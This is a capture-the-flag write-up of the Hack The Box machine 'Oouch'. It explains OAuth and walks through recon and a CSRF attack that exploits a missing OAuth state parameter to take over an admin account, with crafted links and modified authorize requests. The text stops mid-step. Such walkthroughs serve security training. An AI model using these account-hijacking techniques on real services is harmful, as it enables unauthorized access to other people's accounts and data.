---
title: HTB: Oouch
url: https://0xdf.gitlab.io/2020/08/01/htb-oouch.html
date: 2020-08-01T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-oouch, hackthebox, ctf, oauth, nmap, ftp, vsftpd, vhosts, csrf, gobuster, api, ssh, container, docker, dbus, iptables, command-injection, injection, uwsgi, waf, cron, htb-lame, htb-secnotes
---

![Oouch](https://0xdfimages.gitlab.io/img/oouch-cover.png)

The first half of Oouch built all around OAuth, a technology that is commonplace on the internet today, and yet I didn’t understand well coming into the challenge. This box forced me to gain an understanding, and writing this post cemented that even further. To get user, I’ll exploit an insecure implementation of OAuth via a CSRF twice. The first time to get access to qtc’s account on the consumer application, and then to get access to qtc’s data on the authorization server, which includes a private SSH key. With a shell, I’ll drop into the consumer application container and look at how the site was blocking XSS attacks, which includes some messaging over DBus leading to iptables blocks. I’ll pivot to the www-data user via a uWSGI exploit and then use command injection to get execution as root. In Beyond Root, I’ll look at the command injection in the root DBus server code.

## Box Info

| Name | [Oouch](https://hackthebox.com/machines/oouch)  [Oouch](https://hackthebox.com/machines/oouch) [Play on HackTheBox](https://hackthebox.com/machines/oouch) |
| --- | --- |
| Release Date | [29 Feb 2020](https://twitter.com/hackthebox_eu/status/1233063359530110976) |
| Retire Date | 01 Aug 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Oouch |
| Radar Graph | Radar chart for Oouch |
| First Blood User | 03:27:54[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| First Blood Root | 07:52:04[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [qtc qtc](https://app.hackthebox.com/users/103578) |

## Oauth

### Where’s Recon?

For anyone who has read my HTB write-ups before, I always start with Recon, and try to introduce the technology as I come across it. The user portion of Oouch is completely centered on Oauth, an open standard authorization protocol / framework for access delegation, which allows users to grant access to a website to access information on another website without giving the first site the password for the second. Oauth is complicated, and I was finding that trying to introduce it mixed into the enumeration was getting confusing, hence this section up front.

### Resources

I did a lot of reading about OAuth to solve Oouch, and then a lot of reading again trying to make this post useful several months later. The most useful resource I found was [this medium post](https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85), not because it had a ton of detail, but because it had both charts that showed the various flows *and* the details of the requests that were used at each step. This allowed me to identify different requests and redirects that I was seeing and match them against the flow.

I read a lot of “what is OAuth” posts, but none got really into the depth I needed to solve this box. I did read through the [RFC](https://tools.ietf.org/html/rfc6749) itself. It came be confusing a lot of the times, but has all the detail, and some good ASCII diagrams.

### OAuth Basics

#### General

OAuth defines how three different services interact with each other to share data for the benefit of their users. For example, “Log in with Google” (or some Facebook or GitLab or any other service) is a common case. Some website wants you to create an account, and to have an account, you have to provide an email address, and a phone number. You can sign up and create another account, or you can click “Log in with Google”, and then the small website and Google exchange information and you have an account there. OAuth solves the problem of how do you securely let those two sites talk such that the website knows you are actually authenticated with Google, and only get the information it’s supposed to get.

The three services are the application (or consumer to use the term from Oouch), the authorization server, and the resource server (in the example above Google is both the authorization server and the resource server - this is typical, but it doesn’t have to be this way). Because these two are often the same (both for what we need for Oouch and for many real life examples), I’ll refer to them sometimes just as the OAuth provider.

#### Set Up

Before a user gets involved, the application needs to register with the OAuth provider. The OAuth provider will have some form to submit, which will include the kind of data that the application wants access to. On registration, the OAuth provider will return to the application a `CLIENT_ID` and `CLIENT_SECRET`.

#### Authorization Flow

The Authorization Flow is the one necessary to understand for Oouch. The user goes to the application (think some website), and clicks the “Log in with Google” link instead of creating an account locally. The application returns a HTTP redirect with a url pointing to the authorization server, with GET parameters that include the `CLIENT_ID` and a `redirect_uri`. The `redirect_uri` is where the applications wants the user sent back to once they are done with the authorization server.

The user now is at the authorization server, where they are asked to log in (if not already), and then presented the option to approve access for the application to data from the resource server. On clicking yes, the authorization server returns a HTTP redirect back to the `redirect_uri` that was passed to it, but also includes an `authorization_code` as a GET parameter.

The `authorization_code` is not enough on it’s own to get access to information from the resource server. It was passed through the user, and could have been compromised there. It is just a short-lived part of the authentication process. The application will send the `CLIENT_ID`, `CLIENT_SECRET`, `authorization_code`, and `redirect_url` that was originally associated with this request directly to the authorization server (not through the user), and get back an `access_token`.

The application can set the `access_token` as the Bearer header in requests to the resource server. Typically once it gets that data it returns a page to the user showing them logged in.

I created this diagram to try to show the process:

[![OAuth Authorization Flow](https://0xdfimages.gitlab.io/img/image-20200730181927997.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200730181927997.png)

You’ll see this again and again throughout this post, with different parts highlighted.

My description and diagram are a simplified version of what’s shown in this image from [this post](https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85):

![Image for post](https://0xdfimages.gitlab.io/img/1ULF38OTiNJNQZ4lHQZqRwQ.png)

## Recon

### nmap

`nmap` shows four open TCP ports: FTP (21), SSH (22), and HTTP (5000 and 8000):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.177 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:12 EST
Nmap scan report for 10.10.10.177
Host is up (0.015s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds

root@kali# nmap -p 21,22,5000,8000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.177 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:15 EST
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=2/29%Time=5E5AB83E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.81 seconds

```

The [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server) suggests this host is running is Debian 10 buster.

### FTP - TCP 21

The version string from `nmap`, “vsftpd 2.0.8 or later” is weird. I’ve never seen vsftpd print like “or later” before. I did check to see if the v2.3.4 backdoor (like in [Lame](/2020/04/07/htb-lame.html#vsftpd-exploit)), but didn’t get anywhere. Seems like more of an easter egg than a path.

`nmap` also identified that anonymous access was allowed on FTP. On logging in, I see one file, `project.txt`:

```

root@kali# ftp 10.10.10.177
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 .
drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 ..
-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (54.6251 kB/s)

```

It’s a small file, which suggests terms for the two webservers.

```

root@kali# cat project.txt 
Flask -> Consumer
Django -> Authorization Server

```

Given the name of the box, I’m already thinking [OAuth](https://oauth.net/2/), and this would indicate that one of the webservers is the site I want to access, and the other is the authorization server.

### Website - TCP 8000

Visiting port 8000 just returns:

```

HTTP/1.1 400 Bad Request
Content-Type: text/html
Vary: Authorization
<h1>Bad Request (400)</h1>

```

I ran `gobuster` and poked around a bit, but nothing interesting came out. I’ll come back to this later with more information.

### Website - TCP 5000

#### Site

The site goes directly to a login page:

![image-20200303210639910](https://0xdfimages.gitlab.io/img/image-20200303210639910.png)

There is a Register link at the top. Once I create a user with username, email, and password, I’m sent back to the login screen, where I can log in:

![image-20200303210754302](https://0xdfimages.gitlab.io/img/image-20200303210754302.png)

The Menu link shows the page above. The Profile link shows connected accounts:

![image-20200303211632414](https://0xdfimages.gitlab.io/img/image-20200303211632414.png)

The Password Change link provides a form to change my password. I checked the POST request to see if it could be an CSRF like in [SecNotes](/2019/01/19/htb-secnotes.html#intended-route-xsrf), but there was a `csrf_token` parameter submitted.

The Documents link says this section is only available for administrative accounts at this time.

The About page says that this is an auth server:

> This application is the pilot project for our Oouch authorization server. This server configuration matches the setup that we want to deploy to production soon. It is implemented according to high security standards and offers a simple but secure authorization system across several applications. If you notice bugs inside the application or the authentication flow, please inform our system administrator.

#### /contact

Finally, the Contact link has a textbox to submit feedback to the system administrator:

> Customer contact is really important for us. If you have feedback to our site or found any bugs that influenced your user experience, please do not hesitate to contact us. Messages that were submitted in the message box below are forwarded to the system administrator. Please do not submit security issues using this form. Instead ask our system administrator how to establish an encrypted communication channel.

I can submit a link in there, and it will be clicked on by someone. For example, if I submit:

```

<a href="http://10.10.14.6/0xdf">click me</a>

```

I can see a connection attempt in Python `http.server` or in `nc` about a minute later:

```

root@kali# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 60462
GET /0xdf HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```

I looked for vulnerabilities in Python Requests, but didn’t find anything.

I also tried some cross site scripting, but anything with `<script>` or `<img>` results in this:

![image-20200314134738310](https://0xdfimages.gitlab.io/img/image-20200314134738310.png)

Once that message displayed, I was unable to connect to the site for the next minute.

#### Directory Brute Force

I originally ran `gobuster` with the `small` wordlist I typically use:

```

root@kali# gobuster dir -u http://10.10.10.177:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-5000-root-small -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/29 14:33:59 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/home (Status: 302)
/login (Status: 200)
/register (Status: 200)
/profile (Status: 302)
/documents (Status: 302)
/logout (Status: 302)
===============================================================
2020/02/29 14:40:05 Finished
===============================================================

```

On not finding much else, I came back with `big`:

```

root@kali# gobuster dir -u http://10.10.10.177:5000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o scans/gobuster-5000-root-big -t 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/03 17:39:11 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2020/03/03 17:42:56 Finished
===============================================================

```

One new one appeared: `/oauth` (which makes perfect sense with the focus of the box).

#### /oauth

This page gives instructions for how to connect to the oauth server:

![image-20200303213551892](https://0xdfimages.gitlab.io/img/image-20200303213551892.png)
*Note: Visiting `/oauth/` doesn’t work. The trailing `/` breaks it.*

This must be the account connecting mentioned on the profile page.

I’ll add `consumer.oouch.htb` and `ouch.htb` to my `/etc/hosts` file. I did some fuzzing for other vhosts on :5000, but didn’t find any. I also did a `gobuster` on the `/oauth` path, and found the two paths linked to from `/oauth`, `connect` and `login`, but nothing else.

### authorization.oouch.htb:8000

#### Enumeration of :8000/oauth

Visiting `http://consumer.oouch.htb:5000/oauth/connect` returns a 302 redirect to a new vhost on port 8000:

```

http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read

```

On my OAuth diagram:

[![OAuth Authorization Flow](https://0xdfimages.gitlab.io/img/image-2020073018192796.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-2020073018192796.png)

After adding the `authorization.oouch.htb` subdomain to `/etc/hosts`, that redirect lands me at a login page:

![image-20200729173947737](https://0xdfimages.gitlab.io/img/image-20200729173947737.png)

My account from port 5000 doesn’t work.

#### Web Root

Just visiting `http://authorization.oouch.htb:8000` gives a welcome page for the authorization server:

![image-20200729174104015](https://0xdfimages.gitlab.io/img/image-20200729174104015.png)

The two links point to `http://authorization.oouch.htb:8000/login/` and `http://authorization.oouch.htb:8000/signup/`.

#### Directory Brute Force

Running `gobuster` now with the updated subdomain returns three paths:

```

root@kali# gobuster dir -u http://authorization.oouch.htb:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o scans/gobuster-8000-authorization.out.htb-big -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/04 17:22:49 Starting gobuster
===============================================================
/home (Status: 301)
/login (Status: 301)
/signup (Status: 301)
===============================================================
2020/03/04 17:24:11 Finished
===============================================================

```

`/login` and `/signup` I knew from the welcome page. `/home` returns the same thing as `/` when not logged in.

#### /signup

There is another signup page, for a different account with different requirements:

[![image-20200308163104756](https://0xdfimages.gitlab.io/img/image-20200308163104756.png)](https://0xdfimages.gitlab.io/img/image-20200308163104756.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200308163104756.png)

This makes sense. In a real world scenario, these would be completely different services, hosted by different organization, on different servers. That’s represented by the two ports here in HTB.

I played with the SSH fields, seeing if Oouch would connect back to me on 22, but I didn’t have any luck for now.

#### /home

I was able to create an account and then login. I’m redirected to `/home`:

![image-20200308163317746](https://0xdfimages.gitlab.io/img/image-20200308163317746.png)

Clicking on the link to `/oauth/authorize` returns an error:

![image-20200308163436662](https://0xdfimages.gitlab.io/img/image-20200308163436662.png)

I will poke at that more [later](#qtc-on-authorization).

`/oauth/token` returns what looks like a blank page in the browser, but looking in Burp I see it’s a 405 Method Not Allowed response with no body:

```

HTTP/1.1 405 Method Not Allowed
Content-Type: text/html; charset=utf-8
Allow: POST, OPTIONS
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization

```

If I send that request to Repeater and change it to a post, I get a different error:

```

HTTP/1.1 400 Bad Request
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 35
Vary: Authorization

{"error": "unsupported_grant_type"}

```

I could fuzz this, but given my understanding of OAuth from the introduction, I’m going to come back to this once I have the required inputs, `CLIENT_ID`, `CLIENT_SECRET`, `redirect_uri`, and `authorization_code`.

#### More Directory Brute Force

Before starting to work on Oauth, I also started another `gobuster` in the background to look for endpoints:

```

root@kali# gobuster dir -u http://authorization.oouch.htb:8000/oauth -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -o scans/gobuster-8000-oauth-big
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/09 17:46:45 Starting gobuster
===============================================================
/applications (Status: 301)
/authorize (Status: 301)
/token (Status: 301)
===============================================================
2020/03/09 17:48:19 Finished
===============================================================

```

It found the two endpoints I already knew about, but also this third endpoint, `/oauth/applications`, which I’ll need later. Visiting now just pops HTTP basic auth, and I don’t have valid creds.

### Oauth

#### Connect Accounts

I started to explore how to the oath account connection process works. I started logged into both accounts in my browser. Then I visited the link from the consumer oauth page, `http://consumer.oouch.htb:5000/oauth/connect`. This is like saying “Login with Google” in a public example. Like above, I’m redirected to a page on `authorization.oouch.htb:8000`, but since I’m logged in, I get a page with a question:

![image-20200308171935111](https://0xdfimages.gitlab.io/img/image-20200308171935111.png)

When I click authorize, I’m redirected back to my profile page on port 5000, and now there’s a connected account:

![image-20200308172018997](https://0xdfimages.gitlab.io/img/image-20200308172018997.png)

#### Requests

Looking in Burp, I can see a series of five requests that lead back to `/profile`:

![image-20200308202649128](https://0xdfimages.gitlab.io/img/image-20200308202649128.png)

Those five requests line up with the four requests in my diagram (plug the request to `/profile` which would come next in my diagram):

[![OAuth Authorization Flow](https://0xdfimages.gitlab.io/img/image-20200730181927998.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200730181927998.png)

The first is a GET to `/oauth/connect`, with the cookie for the :5000 site `session`. It returns a 302 redirect to `http://authorization.oouch.htb:8000/oauth/authorize/` with four parameters:
- `client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82`
- `response_type=code`
- `redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token`
- `scope=read`

Following this redirect returns that page with the button for me to click Authorize. Clicking that button sends a POST to the same url, with the same parameters in the url, *and* the same parameters in the POST body, with three additional:
- `csrfmiddlewaretoken=8LoJjvYe7uX6aivOdY7S9DaJgcIFT57CORNJ7x8J63SfG0sZ6zn6UFqj6gi5wdQO`
- `state=`
- `allow=Authorize`

That returns a 302 redirect to `http://consumer.oouch.htb:5000/oauth/connect/token` with the GET parameters `code=72blODjikMf0PbTJ27abbY34XnCjAs`.

The request responds with another 302 redirect, this time to `/profile`.

## Shell as qtc on oouch

### qtc on consumer

#### Vulnerability

I’m going to look at the process where the client is going back to the application with the authorization code.

![img](https://0xdfimages.gitlab.io/img/image-20200730171247468.png)

When the application receives this request, it will reach out to the authorization server and get information about the account that controls login for the application. If I can get someone else to submit this request, then their account will be linked to the account I control on the authorization server.

From the [previous reference](https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85), I can see the Request from the application (consumer) to authorization server looks like this:

```

GET {Authorization Endpoint}
  ?response_type=code             // - Required
  &client_id={Client ID}          // - Required
  &redirect_uri={Redirect URI}    // - Conditionally required
  &scope={Scopes}                 // - Optional
  &state={Arbitrary String}       // - Recommended
  &code_challenge={Challenge}     // - Optional
  &code_challenge_method={Method} // - Optional
  HTTP/1.1
HOST: {Authorization Server}

```

There’s a recommend (and therefore optional) parameter `state` designed to prevent this kind of Cross Site Request Forgery (CSRF) attack. This value isn’t shown to the client, but stored on consumer, associated with my account via cookie. Later, when the authorization is done, and a 302 to the `redirect_uri` is sent back, it’s sent back with the `code` and the `state` if in use. If that state value doesn’t match for the account loading the page, there’s a CSRF failure, and the process fails. Because the 302 from the authorization server with the `authorization_code` doesn’t include `state`, it must not be in use here, and this attack can work.

#### In Practice

First I’ll create accounts for both servers (0xdf-consumer and 0xdf-auth), and log into both, and link the accounts.

![image-20200309173125506](https://0xdfimages.gitlab.io/img/image-20200309173125506.png)

Now I’ll start the account linking process again, but this time, I will have Burp Proxy intercepting each request. I’ll forward the first three requests, stopping when it’s trying to load `consumer.oouch.htb:5000/oauth/connect/token`:

```

GET /oauth/connect/token?code=76tcpZBboMvWODlVU0LNkRDMVCQB7m HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJy1kM9OwzAMxl8ly3mg_G2aPQWCAwc0TY5jrxVdi5pUQpr27kSICwdOwMmy7N_n7_NVnniCMlCRh5erFLUVeaFS4ExyLx8mgkJiWs5inEVdBCC2oajDWMRb27mXx9v-77hHOo-lrlDHZRZP2yfE27QTzzThciGh3jPvfsHe4TKX7ULrDyL_avzb8eO-vX6lMshDXTdq3ZjlQZpoTWfARw_ck4smhaRZaRMwg0NryaPPoECDcsnnjEphz7lTDEZhJqaEnQMMGjoOTkPoooEUvY7EuSn0aD0k5a3jztiI1oSkjGKTk_WqZcGy8qkurzQ3P8FCAq1DMl3wzkGOifvggGyATNBDbC5cto3bCq1fIeTtA92OwOo.XmawFg.5VWJ9iBk8looCFxsuQTc5oCDMJ8
Upgrade-Insecure-Requests: 1

```

I’ll craft that into a link, and drop the request so it’s not sent to the server:

```

<a href="http://consumer.oouch.htb:5000/oauth/connect/token?code=QY4G64bZGMj05zy5Krq49HmMDHIP8w">click me</a>

```

I’ll submit the link to the contact form. After a minute or two, I’ll see 0xdf-auth is no longer connected in the Profile page for 0xdf-consumer:

![image-20200309173807145](https://0xdfimages.gitlab.io/img/image-20200309173807145.png)

I’ll log out, and then go to `/oauth/login`, and click yes when prompted to login using OAuth. But my account on the authorization server now is linked to whoever clicked the link. Visiting the Profile page, I see I’m logged in as qtc:

![image-20200309173903551](https://0xdfimages.gitlab.io/img/image-20200309173903551.png)

### qtc on authorization

#### Enumeration

Now with access to as qtc on the consumer site, I can see documents stored for the admin account:

![image-20200309174022442](https://0xdfimages.gitlab.io/img/image-20200309174022442.png)

The three documents each give a hint:
- I have credentials for application registration.
- I need to find `/api/get_user` API and use it to get user data
- The `/oauth/authorize` method, which I saw in the Oauth flow above as a POST, now supports GET, which makes sending it as a link to the contact form a possibility.
- I’ll eventually find SSH keys for qtc which I’ll use to get a shell.

Remembering the `/oauth/applications` path from [above](#more-directory-brute-force), I started to poke around there. It asks for HTTP auth, but it doesn’t work. Eventually I tried `/oauth/applications/register`, and the creds for HTTP basic auth do work there.

![image-20200311061131193](https://0xdfimages.gitlab.io/img/image-20200311061131193.png)

Now I can register an application with the authorization server. Why does this matter? If I can trick something to authorizing my application to connect with the authorization server, I can request the info from the authorization server about that user (which it sounds like included SSH keys).

I was able to register an application with a `redirect_uri` of my box (`/token` is arbitrary, but once I set it here, it has to match in subsequent applications):

![image-20200311065052285](https://0xdfimages.gitlab.io/img/image-20200311065052285.png)

It gives me the `CLIENT_ID` and `CLIENT_SECRET` for the app.

#### :8000/oauth/authorize

With the idea that there are different applications (and now I can create them) in mind, I wanted to look at the OAuth flows associated with `:8000/oauth/authorize` again. Earlier when I hit this endpoint directly, it returned a missing client\_id error. When looking at the Oauth flows in Burp when I was linking my profile, I see two requests in a row to this API. First a GET, then a POST. These represent the two marked requests in the diagram:

[![img](https://0xdfimages.gitlab.io/img/image-20200730174605174.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200730174605174.png)

These requests both include `client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82`. This is the ID that the application on port 5000 received when it registered with the authorization server on port 8000.

I’ll grab the POST request to `:8000/oauth/authorize` in Burp Proxy and kick it over to repeater:

```

POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 264
Connection: close
Cookie: csrftoken=OGnVcXdWziRrIcISRJovzoNterqmLZeifBvxetEu1Inl5LeMP8zTuuHL05bAzVlL; sessionid=1rzmsqcaprtztfba3xxywdrtk1u5vz3j
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=jqwRWtcqi4BTXPHM88lUdUvmFqyCzbWNKicTe2AzGMxTcla1PACQiKx23Wmb0hVR&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Flogin%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize

```

If I send this, I get back a 302 redirect to the `redirect_uri` with the code attached:

```

HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://consumer.oouch.htb:5000/oauth/login/token?code=9E3iRBIZpLtvrwuC0NeNuvWckA3yI8
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie

```

The notes above suggest that this endpoint now supports GET. To convert this to a GET, I started by changing `POST` to `GET`, but that just leads to the page with the button to click Authorize, just like in the Oauth flow originally. I started playing with various POST parameters from the request above, adding them as GET parameters. Once I add `&allow=Authorize` to the GET parameters, I get the redirect I’m looking for. I’ll clean up the request a bit more and get:

```

GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read&allow=Authorize&state= HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close
Cookie: sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6
Upgrade-Insecure-Requests: 1

```

I was able to take out both the CSRF parameter in the POST and the CSRF cookie. I could also take out the `sessionid` cookie, but then I get the login page instead of the `redirect_uri`.

Now I want to change the `redirect_url` to something else, but it returns a 400 Bad request:

```

            <h2>Error: invalid_request</h2>
            <p>Mismatching redirect URI.</p>

```

If I update the `client_id` and the `redirect_uri` to match what I registered above, the request will come back without throwing that error:

```

